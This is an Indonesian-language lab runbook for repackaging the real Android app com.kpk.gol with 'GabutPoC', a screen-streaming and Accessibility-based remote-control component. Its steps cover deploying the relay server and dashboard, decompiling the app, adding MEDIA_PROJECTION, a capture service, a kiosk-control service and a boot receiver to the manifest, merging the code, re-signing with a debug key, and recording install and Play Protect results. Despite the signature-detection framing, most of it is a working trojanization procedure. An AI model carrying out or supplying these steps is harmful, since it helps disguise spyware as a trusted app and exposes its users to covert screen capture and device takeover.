# ALUR EKSEKUSI LAB-2: APK Injection & Sign Detection

## Tahap 1: Setup Server GabutPoC

```bash
# Build & deploy server containers
cd ../Lab-1
./deploy.sh 10.103.105.79
```

**Yang terjadi:**
1. Docker compose up SRS (WebRTC) + Relay (Node) + Dashboard (nginx)
2. `gradle.properties` → `SRS_HOST=10.103.105.79:1985`
3. `web-viewer/config.js` → `window.SRS_HOST = '10.103.105.79:1985'`
4. APK GabutPoC di-build dengan IP server

**Verifikasi:**
- `http://10.103.105.79:8088/dashboard.html` — dashboard aktif
- `http://10.103.105.79:1985/api/v1/streams/` — SRS API respond
- `http://10.103.105.79:8092/devices` — relay API respond

## Tahap 2: Analisis APK GOL

```bash
# GOL APK sudah di-download & diekstrak di:
#   C:\Users\ASUS\AppData\Local\Temp\opencode\gol_extracted\com.kpk.gol.apk
#   C:\Users\ASUS\AppData\Local\Temp\opencode\gol_decompiled\

# Decompile ulang jika perlu
jadx -d gol_decompiled --show-bad-code gol_extracted/com.kpk.gol.apk
```

**Temuan Utama:**
| Aspek | Detail |
|-------|--------|
| Package | `com.kpk.gol` |
| Type | Ionic/Cordova + Firebase |
| Permissions | INTERNET, CAMERA, STORAGE, NOTIFICATIONS |
| Firebase | Auth, Firestore, FCM, Analytics, Crashlytics |
| Web App | Quasar/Vue.js di `assets/www/` |

## Tahap 3: Build GabutPoC APK

```bash
cd ../Lab-1/android
./gradlew assembleDebug
# Output: app/build/outputs/apk/debug/
# Pilih: app-x86_64-debug.apk (untuk emulator 64-bit)
```

## Tahap 4: Teknik Penanaman APK

### Metode: Repackage (Manual)

```
1. apktool d com.kpk.gol.apk -o gol_unpacked
2. Salin GabutPoC smali/kode ke gol_unpacked/smali/
3. Modifikasi AndroidManifest.xml:
   - Tambah permissions: FOREGROUND_SERVICE, MEDIA_PROJECTION, etc.
   - Tambah service: ScreenCaptureService, KioskControlService
   - Tambah receiver: BootReceiver
4. Modifikasi MainActivity.smali untuk muat GabutPoC service
5. apktool b gol_unpacked -o gol_modified.apk
6. Sign ulang dengan debug key:
   - apksigner sign --ks debug.keystore gol_modified.apk
```

### Metode Alternatif: DEX Merging

```
1. Buka GabutPoC APK, extract classes.dex
2. Buka GOL APK, merge classes.dex:
   - d8 --lib android.jar --min-api 23 GabutPoC-classes.dex
   - smali merge
3. Update AndroidManifest & resources
4. Sign ulang
```

## Tahap 5: Sign Detection Test

### Test Case 1: Install APK Asli → APK Modifikasi
```bash
adb install com.kpk.gol.apk                    # APK asli KPK
adb install gol_modified.apk                    # APK modifikasi
# Expected: INSTALL_FAILED_UPDATE_INCOMPATIBLE atau signature mismatch
```

### Test Case 2: Install APK Modifikasi (fresh)
```bash
adb uninstall com.kpk.gol
adb install gol_modified.apk
# Expected: Berhasil install (karena debug sign)
# Play Protect: Mungkin deteksi sebagai spyware
```

### Test Case 3: Cek Signature
```bash
# Cek signature APK asli
keytool -printcert -jarfile com.kpk.gol.apk

# Cek signature APK modifikasi
keytool -printcert -jarfile gol_modified.apk
```

### Response yang Diamati:
| Skenario | Response |
|----------|----------|
| Install APK asli (fresh) | Sukses |
| Install APK modif (fresh) | Sukses, debug sign |
| Install modif over asli | Gagal: signature mismatch |
| Play Protect scan | Flag sebagai potensial spyware |
| Google Play Integrity | Tidak lolos (sign berbeda) |
| Android Verified Boot | Warning signature tidak dikenal |

## Tahap 6: Deploy GabutPoC ke Emulator

```bash
# Install GabutPoC langsung ke emulator
adb install ../Lab-1/android/app/build/outputs/apk/debug/app-x86_64-debug.apk

# Di emulator:
# 1. Buka GabutPoC
# 2. Tap "Aktifkan Stream" → izinkan screen recording
# 3. Tap "Aktifkan Full Control" → enable Accessibility
# 4. Cek dashboard: http://10.103.105.79:8088/dashboard.html
```

## Diagram Alur

```
START
  │
  ├──► [1] Deploy Server (SRS + Relay + Dashboard)
  │
  ├──► [2] Build GabutPoC APK
  │
  ├──► [3] Analisis GOL APK (decompile)
  │
  ├──► [4] Inject GabutPoC ke GOL
  │       │
  │       ├──► buka GOL.apk
  │       ├──► tambah komponen GabutPoC
  │       ├──► update AndroidManifest
  │       ├──► repackage & sign
  │       └──► siap: gol_modified.apk
  │
  ├──► [5] Sign Detection Test
  │       │
  │       ├──► Install APK asli
  │       ├──► Install APK modif → OBSERVE
  │       └──► Catat response system
  │
  └──► [6] Dokumentasi Hasil
```
